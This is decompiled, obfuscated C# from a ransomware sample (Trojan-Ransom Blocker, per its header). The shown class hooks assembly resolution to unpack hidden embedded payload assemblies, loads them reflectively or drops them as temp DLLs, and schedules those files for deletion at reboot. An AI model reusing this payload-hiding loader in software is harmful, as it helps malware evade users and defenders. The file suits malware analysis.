// Decompiled with JetBrains decompiler
// Type: #Ae.#Ie
// Assembly: SynMood, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E74E0BE3-2156-4FD1-87D6-9C934F391488
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.asay-91a905762db9f9c40fe89fad88d7cbf29ff032af.exe

using \u0023Ae;
using \u0023p;
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace \u0023Ae
{
  internal class \u0023Ie
  {
    internal const string \u0023fF = "{71461f04-2faa-4bb9-a0dd-28a79101b599}";
    private const int \u0023gF = 4;
    private static Hashtable \u00239D = new Hashtable();

    [DllImport("kernel32", EntryPoint = "MoveFileEx")]
    private static extern bool \u0023Be(string _param0, string _param1, int _param2);

    internal static bool IsWebApplication
    {
      get
      {
        bool flag;
        try
        {
          string lower = Process.GetCurrentProcess().MainModule.ModuleName.ToLower();
          if (true)
            goto label_8;
label_1:
          string str;
          if (true)
          {
            int num = str == "w3wp.exe" ? 1 : 0;
            if (true)
            {
              if (num != 0)
              {
                if (true)
                {
                  flag = true;
                  goto label_13;
                }
                else
                  goto label_13;
              }
              else
                num = str == "aspnet_wp.exe" ? 1 : 0;
            }
            if (num != 0)
            {
              if (true)
              {
                flag = true;
                goto label_13;
              }
              else
                goto label_13;
            }
            else
              goto label_12;
          }
          else
            goto label_12;
label_8:
          str = lower;
          goto label_1;
        }
        catch
        {
        }
label_12:
        return false;
label_13:
        if (true)
          return flag;
        goto label_12;
      }
    }

    internal static void \u0023Ge()
    {
      try
      {
        AppDomain currentDomain = AppDomain.CurrentDomain;
        ResolveEventHandler resolveEventHandler = new ResolveEventHandler(\u0023Ie.\u0023He);
        if (false)
          return;
        currentDomain.AssemblyResolve += resolveEventHandler;
      }
      catch
      {
      }
    }

    internal static Assembly \u0023He(object _param0, ResolveEventArgs _param1)
    {
      \u0023Ie.\u0023Le le;
      ref \u0023Ie.\u0023Le local = ref le;
      string name = _param1.Name;
      if (true)
        goto label_42;
label_1:
      string str1 = le.\u0023Je(false);
      if (true)
        goto label_43;
label_2:
      string s;
      string base64String = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
      if (true)
        goto label_44;
label_3:
      string[] strArray1;
      if (true)
      {
        char[] chArray1 = new char[1];
        if (true)
          goto label_45;
label_5:
        char[] chArray2;
        chArray2[0] = ',';
        string[] strArray2 = "ezZjMmRjYWExLTA2MGQtNDIwNi05NDJkLTI2NjllNjUzMTFiOX0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{74c0bdf1-2ee1-481b-8de4-7fa45668fe24},ezZjMmRjYWExLTA2MGQtNDIwNi05NDJkLTI2NjllNjUzMTFiOX0=,[z]{74c0bdf1-2ee1-481b-8de4-7fa45668fe24}".Split(chArray2);
        if (true)
        {
          strArray1 = strArray2;
          goto label_6;
        }
        else
          goto label_6;
label_45:
        chArray2 = chArray1;
        goto label_5;
      }
label_6:
      string empty = string.Empty;
      if (true)
        goto label_47;
label_7:
      bool flag1 = false;
      bool flag2 = false;
      int index1 = 0;
label_11:
      string str2;
      for (; index1 < strArray1.Length - 1; index1 += 2)
      {
        if (strArray1[index1] == str2)
          goto label_9;
      }
      goto label_12;
label_9:
      string str3 = strArray1[index1 + 1];
label_12:
      if (str3.Length == 0 && le.\u0023jF.Length == 0)
      {
        str2 = Convert.ToBase64String(Encoding.UTF8.GetBytes(le.\u0023hF));
        for (int index2 = 0; index2 < strArray1.Length - 1; index2 += 2)
        {
          if (strArray1[index2] == str2)
          {
            str3 = strArray1[index2 + 1];
            if (false)
              goto label_11;
            else
              break;
          }
        }
      }
      if (str3.Length > 0)
      {
        if (str3[0] == '[')
        {
          int num = str3.IndexOf(']');
          string str4 = str3.Substring(1, num - 1);
          flag1 = str4.IndexOf('z') >= 0;
          flag2 = str4.IndexOf('t') >= 0;
          if (true)
            str3 = str3.Substring(num + 1);
          else
            goto label_9;
        }
        lock (\u0023Ie.\u00239D)
        {
          if (\u0023Ie.\u00239D.ContainsKey((object) str3))
            return (Assembly) \u0023Ie.\u00239D[(object) str3];
          Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(str3);
          if (manifestResourceStream != null)
          {
            int length = (int) manifestResourceStream.Length;
            byte[] numArray = new byte[length];
            manifestResourceStream.Read(numArray, 0, length);
            if (flag1)
              numArray = \u0023u.\u0023t(numArray);
            Assembly assembly;
            do
            {
              assembly = (Assembly) null;
              if (!flag2)
              {
                try
                {
                  assembly = Assembly.Load(numArray);
                }
                catch (FileLoadException ex)
                {
                  flag2 = true;
                }
                catch (BadImageFormatException ex)
                {
                  flag2 = true;
                }
              }
              if (flag2)
              {
                try
                {
                  string path1 = string.Format("{0}{1}\\", (object) Path.GetTempPath(), (object) str3);
                  do
                  {
                    Directory.CreateDirectory(path1);
                    string path2 = path1 + le.\u0023hF + ".dll";
                    if (!File.Exists(path2))
                    {
                      FileStream fileStream = File.OpenWrite(path2);
                      fileStream.Write(numArray, 0, numArray.Length);
                      fileStream.Close();
                      \u0023Ie.\u0023Be(path2, (string) null, 4);
                      \u0023Ie.\u0023Be(path1, (string) null, 4);
                    }
                    assembly = Assembly.LoadFile(path2);
                  }
                  while (false);
                }
                catch
                {
                }
              }
            }
            while (false);
            \u0023Ie.\u00239D[(object) str3] = (object) assembly;
            return assembly;
          }
        }
      }
      return (Assembly) null;
label_47:
      str3 = empty;
      goto label_7;
label_44:
      str2 = base64String;
      goto label_3;
label_43:
      s = str1;
      goto label_2;
label_42:
      local = new \u0023Ie.\u0023Le(name);
      goto label_1;
    }

    internal struct \u0023Le
    {
      public string \u0023hF;
      public Version \u0023Kv;
      public string \u0023iF;
      public string \u0023jF;

      public string \u0023Je(bool _param1)
      {
        StringBuilder stringBuilder1 = new StringBuilder();
        if (true)
          goto label_11;
label_1:
        StringBuilder stringBuilder2;
        stringBuilder2.Append(this.\u0023hF);
        if (true)
        {
          int num;
          for (int index = _param1 ? 1 : 0; index != 0; index = num)
          {
            num = this.\u0023Kv != (Version) null ? 1 : 0;
            if (true)
            {
              if (num != 0)
              {
                stringBuilder2.Append(", Version=");
                stringBuilder2.Append((object) this.\u0023Kv);
                break;
              }
              break;
            }
          }
          stringBuilder2.Append(", Culture=");
        }
        if (true)
        {
          stringBuilder2.Append(this.\u0023iF.Length == 0 ? "neutral" : this.\u0023iF);
          stringBuilder2.Append(", PublicKeyToken=");
          stringBuilder2.Append(this.\u0023jF.Length == 0 ? "null" : this.\u0023jF);
        }
        return stringBuilder2.ToString();
label_11:
        stringBuilder2 = stringBuilder1;
        goto label_1;
      }

      public \u0023Le(string assemblyFullName)
      {
        this.\u0023Kv = (Version) null;
        this.\u0023iF = string.Empty;
        this.\u0023jF = string.Empty;
        this.\u0023hF = string.Empty;
        string str1 = assemblyFullName;
        char[] chArray = new char[1]{ ',' };
        foreach (string str2 in str1.Split(chArray))
        {
          string str3 = str2.Trim();
          if (str3.StartsWith("Version="))
            this.\u0023Kv = new Version(str3.Substring(8));
          else if (str3.StartsWith("Culture="))
          {
            this.\u0023iF = str3.Substring(8);
            if (this.\u0023iF == "neutral")
              this.\u0023iF = string.Empty;
          }
          else if (str3.StartsWith("PublicKeyToken="))
          {
            this.\u0023jF = str3.Substring(15);
            if (this.\u0023jF == "null")
              this.\u0023jF = string.Empty;
          }
          else
            this.\u0023hF = str3;
        }
      }
    }
  }
}
